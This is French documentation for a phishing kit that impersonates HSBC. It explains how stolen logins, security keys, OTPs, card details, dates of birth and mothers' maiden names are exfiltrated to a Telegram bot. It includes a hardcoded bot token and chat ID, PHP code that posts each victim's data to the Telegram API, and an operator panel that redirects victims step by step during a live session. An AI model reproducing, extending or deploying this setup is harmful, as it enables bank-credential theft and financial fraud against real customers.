# Notifications Telegram et lien d'administration client

## Vue d'ensemble

Chaque fois qu'un visiteur soumet des données sur le formulaire (login, clé de sécurité, OTP, carte bancaire, etc.), le script `secure/app/send.php` envoie une notification à Telegram. **Chaque message inclut un lien direct vers le panel d'administration du client**, permettant à l'opérateur de gérer ce visiteur en un clic.

---

## Configuration Telegram

**Fichier :** `secure/config/config.php`

```php
$bot = '5921410949:AAEoUIUbUJyM4FaAmb9O5IQS2jpBgVgJUio';
$chat_ids = array('-5087487823');
```

- **Bot Token** : identifiant du bot Telegram
- **Chat IDs** : un ou plusieurs identifiants de conversation (groupe ou discussion privée) qui reçoivent les notifications

---

## Construction du lien d'administration

### Comment le lien est généré

Le lien est construit au début de `send.php` (lignes 61-72) :

```php
// 1. Construire l'URL de base du panel
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$requestUri = $_SERVER['REQUEST_URI'];
$panelUrl = str_replace("app/send.php", "panel/dash/index.php", $protocol . "://" . $host . $requestUri);

// 2. Ajouter l'IP du client (identifiant unique)
$panelLink = $panelUrl . "?ip=" . urlencode($ip);

// 3. Ajouter le visitId si disponible (identifiant de session)
if ($visitId) {
    $panelLink .= "&visitId=" . urlencode($visitId);
}
```

### Structure du lien

| Composant | Description |
|-----------|-------------|
| **Base** | Même domaine et protocole que la requête actuelle |
| **Chemin** | `secure/panel/dash/index.php` (dashboard admin) |
| **Paramètre `ip`** | IP du visiteur — **obligatoire** pour identifier le client |
| **Paramètre `visitId`** | Identifiant de session (optionnel) |

**Exemple de lien généré :**
```
https://exemple.com/secure/panel/dash/index.php?ip=203.0.113.42&visitId=abc123xyz
```

### Source de l'IP

L'IP provient de `PanelManager` qui détecte l'IP réelle via les headers HTTP (Cloudflare, proxy, etc.) ou `REMOTE_ADDR`. Cette même IP sert à identifier le client dans `vic.json` et à le retrouver dans le panel.

---

## Méthode d'envoi vers Telegram

### Fonction `sendTelegramMessage()`

```php
function sendTelegramMessage($text, $botToken, $chatIds) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    foreach ($chat_ids as $chatId) {
        $postData = http_build_query([
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'HTML'
        ]);
        // Requête cURL POST vers l'API Telegram
    }
}
```

- **API** : `https://api.telegram.org/bot{token}/sendMessage`
- **Méthode** : POST
- **Paramètres** : `chat_id`, `text`, `parse_mode=HTML`
- **Envoi** : à tous les chat IDs configurés

---

## Format des messages

### Fonction `buildMessage()`

Chaque notification suit une structure standardisée :

```
=========HS-REZ-=========

🏦 {Titre de l'étape}

------------
👤 Username: valeur
------------
🌐 IP: {ip_du_client}
🔗 Panel: {lien_administration}

===========oZy===========
```

Le **lien Panel** est toujours ajouté en fin de bloc, juste avant la signature `oZy`.

### Emojis selon le type de champ

| Type de donnée | Emoji |
|----------------|-------|
| Username / Name | 👤 |
| Password / Security Key | 🔑 |
| OTP / Code | 🔐 |
| Carte | 💳 |
| Téléphone | 📱 |
| Autre | 📝 |

---

## Moments d'envoi des notifications

Chaque étape du formulaire envoie une notification distincte :

| Étape | Déclencheur POST | Titre du message |
|-------|------------------|------------------|
| 1. Login | `username` | HSBC Login |
| 2. Security Key | `securityCode` | HSBC Secure Key |
| 3. OTP | (géré dans les étapes) | — |
| 4. Additional Security | `dob-day` ou `motherName` ou `emailAddress` | HSBC Additional Security |
| 5. Carte bancaire | `cardNumber` | HSBC Card Information |
| 6. Contact | `fullName` ou `mobileNumber` | HSBC Contact Information |

**Cas spécial — Carte bancaire :** le message est construit manuellement (pas via `buildMessage`) pour inclure les infos BIN (banque, type de carte). Le lien Panel est quand même inclus aux lignes 291-292.

---

## Flux complet

```
[Visiteur] soumet un formulaire (f7k2m9x, p3n8q4w, h9c3y7b, etc.)
        ↓
[app.js] envoie POST vers secure/app/send.php (AJAX)
        ↓
[send.php]
  1. Récupère l'IP via PanelManager
  2. Construit le lien : panel/dash/index.php?ip={ip}&visitId={visitId}
  3. Construit le message avec buildMessage() ou format spécifique
  4. Appelle sendTelegramMessage($message, $bot, $chat_ids)
  5. Enregistre le client avec $panel->newCustomer() (étape login)
        ↓
[Telegram] message reçu avec lien cliquable
        ↓
[Opérateur] clique sur le lien → ouvre le dashboard avec ce client pré-sélectionné
```

---

## Utilisation du lien par l'opérateur

En cliquant sur le lien **Panel** dans Telegram, l'opérateur arrive sur :

`/secure/panel/dash/index.php?ip=xxx`

Il peut alors :
- **Rediriger** le client vers une étape précise (LOGIN, SECURITY KEY, OTP, etc.)
- **Confirmer** (YES/NO) la progression de l'étape courante
- **Saisir** les données carte/client pour pré-remplir le formulaire côté visiteur
- **Surveiller** l'étape actuelle du client (bouton vert clignotant)

Le paramètre `ip` est le lien entre le message Telegram et le client dans le panel : c'est l'identifiant unique utilisé dans `vic.json`.

---

## Résumé

| Élément | Détail |
|---------|--------|
| **Script d'envoi** | `secure/app/send.php` |
| **Configuration** | `secure/config/config.php` |
| **API Telegram** | `api.telegram.org/bot{token}/sendMessage` |
| **Lien admin** | `{domaine}/secure/panel/dash/index.php?ip={ip}[&visitId={id}]` |
| **Identification client** | IP + optionnellement visitId |
| **Fréquence** | Une notification par soumission de formulaire |
